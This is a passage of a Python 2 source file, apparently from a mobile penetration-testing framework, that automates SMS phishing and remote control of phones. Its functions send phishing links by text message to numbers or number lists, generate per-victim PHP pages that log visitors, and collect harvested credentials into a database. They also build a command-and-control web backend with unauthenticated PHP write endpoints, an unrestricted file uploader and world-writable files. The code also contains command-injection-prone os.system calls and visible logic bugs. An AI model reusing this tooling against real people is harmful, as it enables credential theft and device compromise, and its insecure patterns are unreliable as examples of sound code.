                                        	db.query("INSERT INTO basicresults (id,label,path,number,timestamp,agent) VALUES (DEFAULT, %s, %s,%s,%s,%s)", (label , url, number, timestamp, agent))
			
		db.query("create table if not exists harvesterresults (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000), creds varchar(60000))")
        	row = db.fetchone()[0]
        	db.query("SELECT COUNT(*) from campaigns")
                row = db.fetchone()[0]
        	for i in range(1, row+1):
          		db.query("SELECT path from campaigns where id=%s", (i))
           		url = db.fetchone()[0]
                        db.query("SELECT label from campaigns where id=%s", (i))
                        label = db.fetchone()[0]
			db.query("SELECT type from campaigns where id=%s", (i))
			type = db.fetchone()[0]
			if type == "harvester":
				filename = webserver + url + "/results"
				print label + ":" 
				with open(filename) as f:
                   			lines = f.readlines()
					mylines = '-'.join(lines)
                   			arrayoflines = mylines.split("Array")
					for j in range(0,len(arrayoflines)):
						print arrayoflines[j]
                                        	db.query("INSERT INTO harvesterresults (id,label,path,creds) VALUES (DEFAULT, %s, %s,%s)", (label , url, arrayoflines[j]))


					
            		


def basicphish(url,text,number,numberfile,campaignlabel):
       if text == None:
		text = "This is a cool page: " 
       webserver = config.get('WEBSERVER')
       ipaddress = config.get('IPADDRESS')
       localpath = webserver + url
       if not os.path.exists(localpath):
            command1  = "mkdir " + localpath
            os.system(command1)
       results = localpath + "/results"
       command8   = "touch " + results
       os.system(command8)
       command9 = "chmod 777 " + results
       os.system(command9)
       campaign_db(campaignlabel,url,"basic")
       if number != None:
	     makephishpage(number,url)
             fulllink = "http://" + ipaddress + url + "/" + number + ".php"
             fulltext = text +" "+  fulllink
	     sendsms(number,fulltext)
       elif numberfile != None:
	     with open(numberfile) as f:
                   lines = f.readlines()
                   for line in lines:
			line = line.strip()
			makephishpage(line,url)
                        fulllink = "http://" + ipaddress + url + "/" + line + ".php"
                        fulltext = text +" "+ fulllink
	                sendsms(line,fulltext)

def sendsms(number,text):
        webserver = config.get('WEBSERVER')
	modem = 1
	db = DB(config=config)
        db.query("SELECT path from modems where id=%s", (modem,))
        path2 = db.fetchone()[0].replace('"', '')
        db.query("SELECT controlkey from modems where id=%s", (modem,))
        key2 = db.fetchone()[0]
        db.query("SELECT type from modems where id=%s", (modem,))
        modemtype2 = db.fetchone()[0]
	control = webserver + path2 + "/getfunc"
        with open(control, 'a') as f:
            command2 = key2 + " " + "SEND" + " " + number + " " + text + "\n"
	    f.write(command2)
        print "Sent SMS to " + number

def makephishpage(number,url):
       webserver = config.get('WEBSERVER')
       filename = "/" + number + ".php"
       localpath = webserver + url
       sploitfile = localpath + filename
       command8   = "touch " + sploitfile
       os.system(command8)
       command9 = "chmod 777 " + sploitfile
       os.system(command9)		
       sploitfiletext = "<?php\necho \"You Got Phished!\";\n$agent = $_SERVER['HTTP_USER_AGENT'];\n$page = " + number + ";\n$time = @date('[d/M/Y:H:i:s]');$thing = $time . \" \" . $page . \" \" . $agent;\n$file = results;\n$current = file_get_contents($file);\n$current .= $thing . \"\\n\";\nfile_put_contents($file, $current);\n?>"
       SPLOITFILE = open(sploitfile, 'w')
       SPLOITFILE.write(sploitfiletext)
       SPLOITFILE.close()
		
def stop_poller(poller):
	if poller == "api" or "all":
	  p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
          out, err = p.communicate()
          for line in out.splitlines():
             if 'apipoller.py' in line:
                pid = int(line.split()[1])
                os.kill(pid, signal.SIGKILL)
        if poller == "modem" or "all":	
		p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
          	out, err = p.communicate()
          	for line in out.splitlines():
             		if 'modempoller.py' in line:
                		pid = int(line.split()[1])
                		os.kill(pid, signal.SIGKILL)
        if poller == "agent" or "all":
           	p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
                out, err = p.communicate()
                for line in out.splitlines():
                        if 'agentpoller.py' in line:
                                pid = int(line.split()[1])
                                os.kill(pid, signal.SIGKILL)
		if check_mysql() == 0:
                       os.system("service mysql start>/dev/null")
                try:
                    db = DB(config=config)
                except DBException as e:
                  if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))

		db = DB(config=config)
                db.query("DROP TABLE IF EXISTS agents")
                db.query("DROP TABLE IF EXISTS agentdata")

def make_api(path,key):
            make_apifiles(path)
            startcommand = "python apipoller.py " + path + " " + key + " > log"
            pid = os.fork()
            if pid == 0:
                os.system(startcommand)

def make_apifiles(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11) 
    getfuncfile = fullpath + "/getfunc"
    command6 = "touch " + getfuncfile
    os.system(command6)
    command7 = "chmod 777 " + getfuncfile
    os.system(command7)
    putfuncfile = fullpath + "/putfunc"
    command6 = "touch " + putfuncfile
    os.system(command6)
    command7 = "chmod 777 " + putfuncfile
    os.system(command7)
    getfuncupload = fullpath + "/getfuncuploader.php"
    command10 = "touch " + getfuncupload
    os.system(command10)
    command11 = "chmod 777 " + getfuncupload
    os.system(command11)
    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'a');\nfwrite($file, $base);\n?>";
    GETFUNCUPLOADFILE = open(getfuncupload, 'w')
    GETFUNCUPLOADFILE.write(getfuncuploadtext)
    GETFUNCUPLOADFILE.close()
    putfuncupload = fullpath + "/putfuncuploader.php"
    command10 = "touch " + putfuncupload
    os.system(command10)
    command11 = "chmod 777 " + putfuncupload
    os.system(command11)
    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'a');\nfwrite($file, $base);\n?>";
    PUTFUNCUPLOADFILE = open(putfuncupload, 'w')
    PUTFUNCUPLOADFILE.write(putfuncuploadtext)
    PUTFUNCUPLOADFILE.close()


def check_apache():
	process = os.popen("ps x | grep apache").read().splitlines()
	if len(process) > 2:
		return 1
	else:
		return 0

def check_mysql():
	process = os.popen("netstat -antp | grep mysql").read().splitlines()
	if len(process) == 1:
		return 1
	else:
		return 0
def make_modem(number,url,key):
	make_files2(url)
        if check_apache()== 0:
		os.system("service apache2 start>/dev/null")
        handshake(url,key)
        modemtype = "app"
        database_add2(number,url,key,modemtype)
        startcommand = "python modempoller.py " + url + " " + key + " > log"
        pid = os.fork()
        if pid == 0:
                os.system(startcommand) 
def campaign_db(label,url,type):
    if check_mysql() == 0:
	os.system("service mysql start")
    try:
            db = DB(config=config)
    except DBException as e:
        if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS") + ">/dev/null")

        else:
                raise
    db = DB(config=config)

   
    db.query("create table if not exists campaigns (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000),type varchar (1000), path varchar(1000))")
    db.query("INSERT INTO campaigns (id,label,type,path) VALUES (DEFAULT, %s, %s, %s)", (label,type,url))


def database_add2(number, path, key, _type):
    if check_mysql() == 0:
	os.system("service mysql start")
    try:
            db = DB(config=config)
    except DBException as e:
        if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))

        else:
                raise
    db = DB(config=config)

    queryes = [
            "DROP TABLE IF EXISTS modems",
        ]
    queryes.append("create table modems (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(12), path varchar(1000), controlkey varchar(7), type varchar(3))")
    for query in queryes:
            db.query(query)
    table = "modems"
	

    db.query("INSERT INTO "+table+" (id,number,path,controlkey,type) VALUES (DEFAULT, %s, %s, %s, %s)", (number,path,key, _type))


def handshake(path, key):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path + "/connect"
    while True:
        f = open(fullpath, 'r+')
        line = f.readline()
        correctstring = key + " CONNECT"
        if line == correctstring:
            command = "\n" + key + " CONNECTED"
            f.write(command)
            f.close()
            print "CONNECTED!\n"
            break
        else:
            f.close()
            time.sleep(1)

         
def make_files2(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir -p " + fullpath 
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11) 
    connectfile = fullpath + "/connect"
    command2 = "touch " + connectfile
    os.system(command2)
    command3 = "chmod 777 " + connectfile
    os.system(command3)
    picturefile = fullpath + "/picture.jpg"
    command4 = "touch " + picturefile
    os.system(command4)
    command5 = "chmod 777 " + picturefile
    os.system(command5)
    textfile = fullpath + "/text.txt"
    command6 = "touch " + textfile
    os.system(command6)
    command7 = "chmod 777 " + textfile
    os.system(command7)
    textfile2 = fullpath + "/text2.txt"
    command77 = "touch " + textfile2
    os.system(command77)
    command7777 = "chmod 777 " + textfile2
    os.system(command7777)
    pictureupload = fullpath + "/pictureupload.php"
    command8 = "touch " + pictureupload
    os.system(command8)
    command9 = "chmod 777 " + pictureupload
    os.system(command9)
    pictureuploadtext = "<?php\n$base=$_REQUEST['picture'];\necho $base;\n$binary=base64_decode($base);\nheader('Content-Type: bitmap; charset=utf-8');\n$file = fopen('picture.jpg', 'wb');\nfwrite($file, $binary);\nfclose($file);\n?>";
    PICFILE = open(pictureupload, 'w')
    PICFILE.write(pictureuploadtext)
    PICFILE.close()
    textupload = fullpath + "/textuploader.php"
    command10 = "touch " + textupload
    os.system(command10)
    command11 = "chmod 777 " + textupload
    os.system(command11)
    textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text.txt', 'ab');\nfwrite($file, $base);\n?>";
    TEXTFILE = open(textupload, 'w')
    TEXTFILE.write(textuploadtext)
    TEXTFILE.close()
    text2upload = fullpath + "/text2uploader.php"
    command100 = "touch " + text2upload
    os.system(command100)
    command110 = "chmod 777 " + text2upload
    os.system(command110)    
    text2uploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text2.txt', 'wb');\nfwrite($file, $base);\n?>";
    TEXT2FILE = open(text2upload, 'w')
    TEXT2FILE.write(text2uploadtext)
    TEXT2FILE.close()
    connectupload = fullpath + "/connectuploader.php"
    command12 = "touch " + connectupload
    os.system(command12)
    command13 = "chmod 777 " + connectupload
    os.system(command13)    
    connectuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('connect','wb');\nfwrite($file, $base);\n?>";
    CONNECTFILE = open(connectupload, "w")
    CONNECTFILE.write(connectuploadtext)
    CONNECTFILE.close()
    getfuncfile = fullpath + "/getfunc"
    command6 = "touch " + getfuncfile
    os.system(command6)
    command7 = "chmod 777 " + getfuncfile
    os.system(command7)
    putfuncfile = fullpath + "/putfunc"
    command6 = "touch " + putfuncfile
    os.system(command6)
    command7 = "chmod 777 " + putfuncfile
    os.system(command7)
    getfuncupload = fullpath + "/getfuncuploader.php"
    command10 = "touch " + getfuncupload
    os.system(command10)
    command11 = "chmod 777 " + getfuncupload
    os.system(command11)
    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'wb');\nfwrite($file, $base);\n?>";
    GETFUNCUPLOADFILE = open(getfuncupload, 'w')
    GETFUNCUPLOADFILE.write(getfuncuploadtext)
    GETFUNCUPLOADFILE.close()
    putfuncupload = fullpath + "/putfuncuploader.php"
    command10 = "touch " + putfuncupload
    os.system(command10)
    command11 = "chmod 777 " + putfuncupload
    os.system(command11)
    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'wb');\nfwrite($file, $base);\n?>";
    PUTFUNCUPLOADFILE = open(putfuncupload, 'w')
    PUTFUNCUPLOADFILE.write(putfuncuploadtext)
    PUTFUNCUPLOADFILE.close()
    appupload = fullpath + "/apkupload.php"
    command12 = "touch " + appupload
    os.system(command12)
    command13 = "chmod 777 " + appupload
    os.system(command13)
    appuploadtext = "<?php\n$file_path = basename( $_FILES['uploadedfile']['name']);\n$f = fopen('text.txt', 'wb');\n$data = $file_path;\nfwrite($f, $data);\nfclose($f);\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {\necho 'success';\n} else{\necho 'fail';\n}\n?>"
    APPUPFILE = open(appupload, 'w')
    APPUPFILE.write(appuploadtext)
    APPUPFILE.close()

if __name__ == '__main__':
    main(sys.argv[1:])

